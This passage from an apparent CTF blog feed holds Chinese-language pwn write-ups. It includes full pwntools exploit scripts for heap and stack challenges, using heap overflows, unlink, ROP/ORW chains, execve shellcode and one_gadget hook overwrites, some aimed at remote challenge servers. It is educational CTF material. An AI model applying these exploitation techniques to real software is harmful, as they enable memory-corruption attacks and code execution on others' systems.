heap_leak &lt;&lt; 12</code></pre><p><img src="https://s2.loli.net/2024/05/19/eM7kiyhCDB5rKgT.png" alt="image-20240519165038422"></p><h5 id="将free-hook改成setcontext-通过setcontext控制rsp进而orw-构造rop最后获得flag"><a href="#将free-hook改成setcontext-通过setcontext控制rsp进而orw-构造rop最后获得flag" class="headerlink" title="将free_hook改成setcontext,通过setcontext控制rsp进而orw,构造rop最后获得flag"></a>将free_hook改成setcontext,通过setcontext控制rsp进而orw,构造rop最后获得flag</h5><pre><code class="lang-py">from pwn import *elf = ELF(&quot;./EzHeap&quot;)context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io=process(&#39;EzHeap&#39;)#io = remote(&#39;8.147.129.121&#39;, 26987)def add_chunk(size, content=b&#39;&#39;):    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;1&#39;)    io.sendlineafter(&quot;size:&quot;, str(int(size)))    io.sendafter(&quot;content:&quot;, content)def delete_chunk(index):    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;2&#39;)    io.sendlineafter(&quot;idx:&quot;, str(index))def edit_chunk(index, size, content):    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;3&#39;)    io.sendlineafter(&quot;idx:&quot;, str(index))    io.sendlineafter(&quot;size:&quot;, str(size))    io.sendafter(&quot;content:&quot;, content)def show_chunk(index):    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;4&#39;)    io.sendlineafter(&quot;idx:&quot;, str(index))def exit_program():    io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;5&#39;)# Add initial chunksadd_chunk(0x28)add_chunk(0x28)# Edit and leak heap addressedit_chunk(0, 0x50, b&#39;a&#39; * 0x50)show_chunk(0)io.recvuntil(b&#39;a&#39; * 0x50)gdb.attach(io)pause()heap_leak = u64(io.recvuntil(b&#39;Welcome to CISCN 2024!&#39;, drop=True).ljust(8, b&#39;\x00&#39;))heap_base = heap_leak &lt;&lt; 12# Edit chunk to set up fake chunkedit_chunk(0, 0x50, b&#39;\x00&#39; * 0x28 + p64(0x21) + b&#39;\x00&#39; * 0x18 + p64(0xd1))# Leak libc addressedit_chunk(1, 0x30, b&#39;a&#39; * 0x30)show_chunk(1)io.recvuntil(b&#39;a&#39; * 0x30)libc_leak = u64(io.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))libc_base = libc_leak - 0x21ace0# Edit chunk to consolidate chunksedit_chunk(1, 0x30, b&#39;\x00&#39; * 0x28 + p64(0xf1))# Set up libc addressessetcontext_address = libc_base + 0x539e0 + 61read_address = libc_base + 0x1147d0write_address = libc_base + 0x114870rtld_global_address = libc_base + 0x285040rtld_3_address = libc_base + 0x2865a0pop_rdi = libc_base + 0x2a3e5pop_rsi = libc_base + 0xe7d0dpop_rdx = libc_base + 0x11f2e7  # r12ret = libc_base + 0x1193c1pop_rax = libc_base + 0x45eb0syscall = libc_base + 0x91316target_address = ((heap_base + 0x1e30) &gt;&gt; 12) ^ rtld_global_address# Add chunks to manipulate heapadd_chunk(0x78)  # Chunk 2add_chunk(0x78)  # Chunk 3add_chunk(0x78)  # Chunk 4add_chunk(0x78)  # Chunk 5edit_chunk(5, 0x100, b&#39;a&#39; * 0x78 + p64(0x21) + p64(target_address))add_chunk(0x18)  # Chunk 6add_chunk(0x18)  # Chunk 7add_chunk(0x18)  # Chunk 8add_chunk(0x18)  # Chunk 9add_chunk(0x18, p64(heap_base + 0x300) + p64(5) + p64(rtld_3_address))heap_leak_adjusted = heap_base - 0x650l_next_address = libc_base + 0x286890# Create link maplink_map = p64(0)link_map += p64(l_next_address)link_map += p64(0)link_map += p64(heap_leak_adjusted + 0x940)link_map += p64(0) * 28link_map += p64(heap_leak_adjusted + 0xa50)link_map += p64(heap_leak_adjusted + 0xa70)link_map += p64(heap_leak_adjusted + 0xa60)link_map += p64(0x10)link_map += p64(setcontext_address)link_map += p64(ret)link_map += p64(0) * 13link_map += p64(heap_leak_adjusted + 0x200)link_map += b&#39;./flag&#39;.ljust(8, b&#39;\x00&#39;)link_map += p64(0)link_map += p64(0x100)link_map += p64(0) * 2link_map += p64(heap_leak_adjusted + 0xc60)link_map += p64(ret)link_map += p64(0) * 38link_map += p64(0x800000000)# Create ROP chainrop_chain = p64(ret) * 0x1rop_chain += p64(pop_rdi) + p64(heap_leak_adjusted + 0xaf0)rop_chain += p64(pop_rax) + p64(2)rop_chain += p64(pop_rsi) + p64(0)rop_chain += p64(syscall)rop_chain += p64(pop_rdi) + p64(3)rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + 0x800)rop_chain += p64(pop_rdx) + p64(0x50) + p64(0)rop_chain += p64(read_address)rop_chain += p64(pop_rdi) + p64(1)rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + 0x800)rop_chain += p64(pop_rdx) + p64(0x50) + p64(0)rop_chain += p64(write_address)# Edit chunk with link map and ROP chainedit_chunk(0, 0x400, link_map + rop_chain)# Exit and trigger the payloadexit_program()io.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easyshell</title>
      <link href="/2024/05/02/easyshell/"/>
      <url>/2024/05/02/easyshell/</url>
      
        <content type="html"><![CDATA[<pre><code>from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,)p=process(&quot;./babyheap&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;libc.so&#39;)elf=ELF(&#39;babyheap&#39;)p.recvuntil(&#39;captcha is: &#39;)cap=p.recv(8)p.sendlineafter(&#39;the captcha: &#39;,cap)#p.sendlineafter(#p.sendlineafter(&#39;Please Select: &#39;,)def add(index,size):    p.sendlineafter(&#39;Please Select: &#39;,&#39;1&#39;)    p.sendlineafter(&#39;Index: &#39;,str(index))    p.sendlineafter(&#39;Size: &#39;,str(size))def fill(size,content):    p.sendlineafter(&#39;Please Select: &#39;,&#39;3&#39;)    p.sendlineafter(&#39;Size: &#39;,str(size))    p.sendlineafter(&#39;Content: &#39;,content)gdb.attach(p)sleep(1)add(20,0x60)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>heap</title>
      <link href="/2024/04/27/heap/"/>
      <url>/2024/04/27/heap/</url>
      
        <content type="html"><![CDATA[<p>chunk就是一整个</p><p><img src="https://s2.loli.net/2024/05/14/f3vUmEAbwlS7J6j.png" alt="image-20240514230404731"></p><p> malloc返回的指针指向chunk的数据区域</p><p>free返回的指针指向chunk的header</p><p>pre_size只有在上一个chunk（物理相邻）是释放时才属于下一个chunk的区域，否则属于上一个chunk的</p><p>free_chunk的大小 0x20~0x0x80,malloc(8)得到的是0x20的chunk</p><p><img src="https://s2.loli.net/2024/05/14/Y7PbWRAnHrodXKG.png" alt="image-20240514230437610"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>note2</title>
      <link href="/2024/04/26/note2/"/>
      <url>/2024/04/26/note2/</url>
      
        <content type="html"><![CDATA[<p> 没开偏移的保护</p><p>size是无符号数</p><p><img src="https://s2.loli.net/2024/04/28/tRUaW5Y9BfsNqeI.png" alt="image-20240426213934832"></p><p>进函数后变有符号数，会有溢出</p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426214016393.png" alt="image-20240426214016393"></p><p><img src="https://s2.loli.net/2024/04/28/Cj3ytfD9z2euRWx.png" alt="image-20240426190337391"></p><p><img src="https://s2.loli.net/2024/04/28/2mSIchNlVYxzaHZ.png" alt="image-20240426190621665"></p><p><img src="https://s2.loli.net/2024/04/28/qxcdEysoNJZnevh.png" alt="image-20240426190918191"></p><h5 id="这里只能用字节来填充，b’-x00’都不行"><a href="#这里只能用字节来填充，b’-x00’都不行" class="headerlink" title="这里只能用字节来填充，b’\x00’都不行"></a>这里只能用字节来填充，b’\x00’都不行</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426211910916.png" alt="image-20240426211910916"></p><h5 id="改了free-got才free的，会执行one-gadget"><a href="#改了free-got才free的，会执行one-gadget" class="headerlink" title="改了free_got才free的，会执行one_gadget"></a>改了free_got才free的，会执行one_gadget</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426213312570.png" alt="image-20240426213312570"></p><h5 id="用system打会报错，不行"><a href="#用system打会报错，不行" class="headerlink" title="用system打会报错，不行"></a>用system打会报错，不行</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240426215822432.png" alt="image-20240426215822432"></p><h5 id="因为这里有个strncat-dest-const-char-v7-15-0xFFFFFFFFFFFFFFFFLL-函数，遇到‘-0’或空字符截停"><a href="#因为这里有个strncat-dest-const-char-v7-15-0xFFFFFFFFFFFFFFFFLL-函数，遇到‘-0’或空字符截停" class="headerlink" title="因为这里有个strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);函数，遇到‘\0’或空字符截停"></a>因为这里有个strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);函数，遇到‘\0’或空字符截停</h5><p><img src="https://s2.loli.net/2024/04/28/c2k16O4aoGXNPDB.png" alt="image-20240426213647135"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node5.buuoj.cn&quot;,27431)p=process(&quot;./note2&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.23.so&#39;)elf=ELF(&#39;./note2&#39;)p.sendlineafter(&#39; name:&#39;,&#39;sdf&#39;)p.sendlineafter(&#39;address:&#39;,&#39;asdf&#39;)def add(size,content):    p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;1&#39;)    p.sendlineafter(&#39;(less than 128)&#39;,str(size))    p.sendlineafter(&#39; content:&#39;,content)def show(index):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;2&quot;)    p.recvuntil(&quot;:&quot;)    p.sendline(str(index))def edit(index, choice, content):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;3&quot;)    p.recvuntil(&quot;:&quot;)    p.sendline(str(index))    p.recvuntil(&quot;]&quot;)    p.sendline(str(choice))    p.recvuntil(&quot;:&quot;)    p.sendline(content)def free(index):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;4&quot;)    p.recvuntil(&quot;:&quot;)    p.sendline(str(index))&#39;&#39;&#39;io.recvuntil(&quot;:&quot;)io.sendline(&quot;/bin/sh&quot;) #nameio.recvuntil(&quot;:&quot;)io.sendline(&quot;ddd&quot;)&#39;&#39;&#39;ptr=0x602120fd=ptr-0x18bk=ptr-0x10payload=b&#39;\x00&#39;*8+p64(0xa1)+p64(fd)+p64(bk)add(0x80,payload)     #0add(0,&#39;sadf&#39;)         #1add(0x80,&#39;bin/sh&#39;)    #2free(1)payload=p64(0)*2+p64(0xa0)+p64(0x90)add(0,payload)free(2)#b&#39;a&#39;*0x18free_got=elf.got[&#39;free&#39;]payload=b&#39;a&#39;*0x18+p64(free_got)edit(0,1,payload)gdb.attach(p)sleep(1)show(0)p.recvuntil(&#39;is &#39;)addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))base=addr-libc.sym[&#39;free&#39;]system=base+libc.sym[&#39;system&#39;]one=base+0xf02a4edit(0,1,p64(system))print(hex(addr))#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_final_5</title>
      <link href="/2024/04/11/ciscn-final-5/"/>
      <url>/2024/04/11/ciscn-final-5/</url>
      
        <content type="html"><![CDATA[<h5 id="没开偏移的保护"><a href="#没开偏移的保护" class="headerlink" title="没开偏移的保护"></a>没开偏移的保护</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411193750286.png" alt="image-20240411193750286"></p><p>地址进行或运算后保存，最后一位存index</p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411193908492.png" alt="image-20240411193908492"></p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411194425445.png" alt="image-20240411194425445"></p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411194802328.png" alt="image-20240411194802328"></p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411195346375.png" alt="image-20240411195346375"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GUESS</title>
      <link href="/2024/03/23/GUESS/"/>
      <url>/2024/03/23/GUESS/</url>
      
        <content type="html"><![CDATA[<p>开了canary</p><p><img src="https://i0.imgs.ovh/2024/03/22/gkJhl.png" alt="image-20240323183540854"></p><h5 id="在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc-后面是第三个envp参数"><a href="#在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc-后面是第三个envp参数" class="headerlink" title="在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数"></a>在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数</h5><p><img src="https://i0.imgs.ovh/2024/03/22/gsrOt.png" alt="image-20240323211819577"></p><h5 id="把argc的位置覆盖成puts-got-泄露偏移，算出environ-base-libc-sym-‘-environ’-这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移"><a href="#把argc的位置覆盖成puts-got-泄露偏移，算出environ-base-libc-sym-‘-environ’-这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移" class="headerlink" title="把argc的位置覆盖成puts_got,泄露偏移，算出environ=base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移"></a>把argc的位置覆盖成puts_got,泄露偏移，算出environ=base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移</h5><h5 id="本地一直打不通，调试也有问题"><a href="#本地一直打不通，调试也有问题" class="headerlink" title="本地一直打不通，调试也有问题"></a>本地一直打不通，调试也有问题</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node5.buuoj.cn&quot;,26222)p=process(&quot;./GUESS&quot;)context.log_level=&quot;debug&quot;elf=ELF(&#39;./GUESS&#39;)puts_got=elf.got[&#39;puts&#39;]libc=ELF(&#39;./libc-2.23.so&#39;)payload=b&#39;a&#39;*0x128+p64(puts_got)p.recvuntil(&#39; guessing flag&#39;)p.sendline(payload)p.recvuntil(&#39;detected ***: &#39;)puts_addr=u64(p.recvuntil(&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))print(hex(puts_addr))base=puts_addr-libc.sym[&#39;puts&#39;]environ=base+libc.sym[&#39;__environ&#39;]payload=b&#39;a&#39;*0x128+p64(environ)gdb.attach(p)p.recvuntil(&#39; guessing flag&#39;)p.sendline(payload)p.recvuntil(&#39;detected ***: &#39;)envi=u64(p.recvuntil(&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))print(hex(envi))flag=envi-0x168payload=b&#39;a&#39;*0x128+p64(flag)p.recvuntil(&#39; guessing flag&#39;)p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bad</title>
      <link href="/2024/03/22/bad/"/>
      <url>/2024/03/22/bad/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/21/eN68l.png" alt="image-20240322140930289"></p><p><img src="https://i0.imgs.ovh/2024/03/21/eNkFd.png" alt="image-20240322141022925"></p><p><img src="https://i0.imgs.ovh/2024/03/21/eN0sK.png" alt="image-20240322141035709"></p><h5 id="很明显地用shellcode写，不过不能用一般的shellcode来写-平时的shellcode是用通过系统调用exceve-‘bin-sh’-0-0-正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用"><a href="#很明显地用shellcode写，不过不能用一般的shellcode来写-平时的shellcode是用通过系统调用exceve-‘bin-sh’-0-0-正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用" class="headerlink" title="很明显地用shellcode写，不过不能用一般的shellcode来写,平时的shellcode是用通过系统调用exceve(‘bin/sh’,0,0),正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用"></a>很明显地用shellcode写，不过不能用一般的shellcode来写,平时的shellcode是用通过系统调用exceve(‘bin/sh’,0,0),正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用</h5><h5 id="seccomp-init-0LL-是初始化seccomp-init函数"><a href="#seccomp-init-0LL-是初始化seccomp-init函数" class="headerlink" title="seccomp_init(0LL);是初始化seccomp_init函数"></a><strong><em>seccomp_init(0LL);</em></strong>是初始化seccomp_init函数</h5><h5 id="0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用"><a href="#0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用" class="headerlink" title="0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用"></a><strong><em>0，1，2，60</em></strong>，分别是允许进程可读，可写，可执行，和退出的系统调用</h5><p><img src="https://i0.imgs.ovh/2024/03/21/eNBi2.png" alt="image-20240322141910159"></p><h5 id="所以这道题只能用orw的方式获取flag"><a href="#所以这道题只能用orw的方式获取flag" class="headerlink" title="所以这道题只能用orw的方式获取flag"></a>所以这道题只能用orw的方式获取flag</h5><pre><code class="lang-py">mmap=0x123000orw_payload=shellcraft.open(&#39;./flag&#39;) #打开根目录下的flag文件，文件标识符为3orw_payload+=shellcraft.read(3,mmap,0x50) #读取文件标识符为3的文件的0x50个字节到地址mmaporw_payload+=shellcraft.write(1,mmap,0x50) #将mmap的地址的值输出</code></pre><h5 id="不把orw-payload写到栈上因为其很大"><a href="#不把orw-payload写到栈上因为其很大" class="headerlink" title="不把orw_payload写到栈上因为其很大"></a>不把orw_payload写到栈上因为其很大</h5><p><img src="https://i0.imgs.ovh/2024/03/21/eaafo.png" alt="image-20240322151355993"></p><h5 id="所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上"><a href="#所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上" class="headerlink" title="所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上"></a>所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上</h5><p><img src="https://i0.imgs.ovh/2024/03/21/ea9JH.png" alt="image-20240322151126619"></p><pre><code class="lang-py">jmp_rsp_ret=asm(&#39;sub rsp,0x30;jmp rsp&#39;)get_shell=asm(&#39;mov rax,0x123000;call rax&#39;)payload=asm(shellcraft.read(0,mmap,0x100))+get_shellpayload=payload.ljust(0x28,b&#39;\x00&#39;)payload+=p64(jmp_rsp)+jmp_rsp_ret#</code></pre><h5 id="实践证明，返回地址不能直接sub-rsp-0x30-jmp-rsp-得先jmp-esp-不然会报错，但我觉得最终的结果都差不多，但是不行。"><a href="#实践证明，返回地址不能直接sub-rsp-0x30-jmp-rsp-得先jmp-esp-不然会报错，但我觉得最终的结果都差不多，但是不行。" class="headerlink" title="实践证明，返回地址不能直接sub rsp,0x30;jmp rsp,得先jmp esp,不然会报错，但我觉得最终的结果都差不多，但是不行。"></a>实践证明，返回地址不能直接sub rsp,0x30;jmp rsp,得先jmp esp,不然会报错，但我觉得最终的结果都差不多，但是不行。</h5><h5 id="最后再写入orw-payload就行了"><a href="#最后再写入orw-payload就行了" class="headerlink" title="最后再写入orw_payload就行了"></a>最后再写入orw_payload就行了</h5><pre><code class="lang-py">p.sendline(asm(orw_payload))</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>b0verfl0w</title>
      <link href="/2024/03/20/b0verfl0w/"/>
      <url>/2024/03/20/b0verfl0w/</url>
      
        <content type="html"><![CDATA[<pre><code class="lang-py">; 汇编指令xor ecx, ecx          ; 将 ecx 寄存器清零mul ecx               ; 将 eax 寄存器中的值与 ecx 寄存器中的值相乘，结果存放在 eax 和 edx 中，相当于 edx = eax * 0push ecx              ; 将 ecx 寄存器中的值压入栈，此时栈顶为 0push 0x68732f2f       ; 将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈push 0x6e69622f       ; 继续将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈mov ebx, esp          ; 将 esp 寄存器中的值（即字符串 &quot;/bin//sh&quot; 的地址）存放到 ebx 寄存器中mov al, 0xb           ; 将 0xb 存放到 al 寄存器中，该值代表 execve 系统调用的编号int 0x80              ; 触发系统调用，执行 execve(&quot;/bin//sh&quot;, NULL, NULL)</code></pre><pre><code class="lang-py">shellcode=b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;+b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;+b&quot;\x0b\xcd\x80&quot;</code></pre><p><img src="https://i0.imgs.ovh/2024/03/19/eJhTA.png" alt="image-20240320230854571"></p><h5 id="ret2shellcode-但是大小不够了"><a href="#ret2shellcode-但是大小不够了" class="headerlink" title="ret2shellcode,但是大小不够了"></a>ret2shellcode,但是大小不够了</h5><p><img src="https://i0.imgs.ovh/2024/03/19/eJKbs.png" alt="image-20240320231042503"></p><pre><code class="lang-py">sub_esp_jmp=asm(&quot;sub esp,0x28;jmp esp&quot;)</code></pre><h5 id="改写其他不行"><a href="#改写其他不行" class="headerlink" title="改写其他不行"></a>改写其他不行</h5><h5 id="返回地址执行到jmp-esp-然后esp-4，执行sub-esp-0x28-jmp-esp，可以跳到shellcode的地址"><a href="#返回地址执行到jmp-esp-然后esp-4，执行sub-esp-0x28-jmp-esp，可以跳到shellcode的地址" class="headerlink" title="返回地址执行到jmp_esp,然后esp+4，执行sub esp,0x28;jmp esp，可以跳到shellcode的地址"></a>返回地址执行到jmp_esp,然后esp+4，执行sub esp,0x28;jmp esp，可以跳到shellcode的地址</h5><pre><code class="lang-py">payload=asm(shellcode)+b&#39;a&#39;*(0x20-len(shellcode))+b&#39;aaaa&#39;+p32(jmp_esp)+sup_esp_jmp</code></pre><p><img src="https://i0.imgs.ovh/2024/03/19/eJ8qV.png" alt="image-20240320234818524"></p><p><img src="https://i0.imgs.ovh/2024/03/19/eJEnJ.png" alt="image-20240320234859035"></p><p><img src="https://i0.imgs.ovh/2024/03/19/eJToW.png" alt="image-20240320234951277"></p><h5 id="jmp-esp的操作，把栈顶设为esp-同时eip指向栈顶"><a href="#jmp-esp的操作，把栈顶设为esp-同时eip指向栈顶" class="headerlink" title="jmp esp的操作，把栈顶设为esp,同时eip指向栈顶"></a>jmp esp的操作，把栈顶设为esp,同时eip指向栈顶</h5><p><img src="https://i0.imgs.ovh/2024/03/20/eimXu.png" alt="image-20240321125420592"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node5.buuoj.cn&quot;,28594)p=process(&quot;./b0verfl0w&quot;)context.log_level=&quot;debug&quot;context.arch=&#39;i386&#39;shellcode=b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;+b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;+b&quot;\x0b\xcd\x80&quot;print(len(shellcode))#gdb.attach(p)sleep(1)jmp_esp=0x08048504sub_esp_jmp=asm(&quot;sub esp,0x28;jmp esp&quot;)payload=shellcode+b&#39;a&#39;*(0x20-len(shellcode))+b&#39;aaaa&#39;+p32(jmp_esp)+sub_esp_jmp#p.sendline(payload)p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>roarctf_2019_easypwn</title>
      <link href="/2024/03/18/roarctf-2019-easy-pwn/"/>
      <url>/2024/03/18/roarctf-2019-easy-pwn/</url>
      
        <content type="html"><![CDATA[<p> 保护全开</p><p>edit函数</p><p><img src="https://i0.imgs.ovh/2024/03/19/e7kas.png" alt="image-20240320152622842"></p><p>若要编辑的大小大过申请的10，可以多输入一字节，存在off-by-one漏洞</p><p><img src="https://i0.imgs.ovh/2024/03/19/e7IOU.png" alt="image-20240320153710315"></p><h4 id="这里不太懂为什么伪造的堆1-free不会报错"><a href="#这里不太懂为什么伪造的堆1-free不会报错" class="headerlink" title="这里不太懂为什么伪造的堆1 free不会报错"></a>这里不太懂为什么伪造的堆1 free不会报错</h4><p><img src="https://i0.imgs.ovh/2024/03/19/e7wKH.png" alt="image-20240319203609474"></p><pre><code class="lang-py">free(1)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/19/e7pZO.png" alt="image-20240319204503356"></p><pre><code class="lang-py">add(0x90)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/19/e7HD9.png" alt="image-20240319204909619"></p><p>试用这种方法也能show出main_arena</p><p><img src="https://i0.imgs.ovh/2024/03/19/e7nO3.png" alt="image-20240319205416560"></p><p><img src="https://i0.imgs.ovh/2024/03/19/e7lwe.png" alt="image-20240319211634694"></p><h4 id="至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小"><a href="#至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小" class="headerlink" title="至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小"></a>至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小</h4><p><img src="https://i0.imgs.ovh/2024/03/18/eKiYo.png" alt="image-20240319233028210"></p><pre><code class="lang-py">add(0x80)</code></pre><h5 id="奇怪，这里再申请0x80的大小，然后size还是0xa1"><a href="#奇怪，这里再申请0x80的大小，然后size还是0xa1" class="headerlink" title="奇怪，这里再申请0x80的大小，然后size还是0xa1"></a>奇怪，这里再申请0x80的大小，然后size还是0xa1</h5><p><img src="https://i0.imgs.ovh/2024/03/19/e73jD.png" alt="image-20240319213208476"></p><p><img src="https://i0.imgs.ovh/2024/03/19/e7mLo.png" alt="image-20240319214042015"></p><h5 id="这里也不太懂为什么要这样写-后面的p64-0x70-p64-0x21"><a href="#这里也不太懂为什么要这样写-后面的p64-0x70-p64-0x21" class="headerlink" title="这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)"></a>这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)</h5><pre><code class="lang-py">payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21)</code></pre><p><img src="https://i0.imgs.ovh/2024/03/19/e760A.png" alt="image-20240319214344529"></p><p><img src="https://i0.imgs.ovh/2024/03/19/e7Wt5.png" alt="image-20240319214501997"></p><h5 id="不过最后的话，是打不通的。"><a href="#不过最后的话，是打不通的。" class="headerlink" title="不过最后的话，是打不通的。"></a>不过最后的话，是打不通的。</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *r=remote(&#39;node5.buuoj.cn&#39;,28118)#r=process(&#39;roarctf_2019_easy_pwn&#39;)libc=ELF(&#39;./libc-2.23.so&#39;)context.log_level=&quot;debug&quot;def add(size):    r.recvuntil(&#39;choice: &#39;)    r.sendline(&#39;1&#39;)    r.recvuntil(&#39;size:&#39;)    r.sendline(str(size))def edit(index,size,data):    r.recvuntil(&#39;choice: &#39;)    r.sendline(&#39;2&#39;)    r.recvuntil(&#39;index:&#39;)    r.sendline(str(index))    r.recvuntil(&#39;size:&#39;)    r.sendline(str(size))    r.recvuntil(&#39;content:&#39;)    r.send(data)def free(index):    r.recvuntil(&#39;choice: &#39;)    r.sendline(&#39;3&#39;)    r.recvuntil(&#39;index:&#39;)    r.sendline(str(index))def show(index):    r.recvuntil(&#39;choice: &#39;)    r.sendline(&#39;4&#39;)    r.recvuntil(&#39;index:&#39;)    r.sendline(str(index))  add(0x18)add(0x10)add(0x90)add(0x10)edit(0,0x22,b&#39;b&#39;*0x10+p64(0x20)+p8(0xa1))edit(2,0x80,p64(0)*14+p64(0xa0)+p64(0x21))free(1)add(0x90)edit(1,0x20,p64(0)*3+p64(0xa1))free(2)show(1)r.recvuntil(&#39;content:&#39;)r.recv(0x20)main_arena=u64(r.recvuntil(&#39;\x7f&#39;).strip()[-6:].ljust(8,b&#39;\x00&#39;))-88malloc_hook=main_arena-0x10base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]realloc_hook=base+libc.sym[&#39;__realloc_hook&#39;]add(0x80)print(hex(main_arena))payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21)edit(1,0x90,payload)free(2)payload=p64(0)*3+p64(0x71)+p64(malloc_hook-0x23)edit(1,0x28,payload)add(0x60) #2add(0x60) #4one=[0x45216,0x4526a,0xf02a4,0xf1147]one_gadget=base+one[3]edit(4,0x1b,b&#39;a&#39;*11+p64(one_gadget)+p64(realloc_hook+4))#gdb.attach(r)sleep(1)add(0x10)r.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_es_7</title>
      <link href="/2024/03/18/ciscn-2019-es-7/"/>
      <url>/2024/03/18/ciscn-2019-es-7/</url>
      
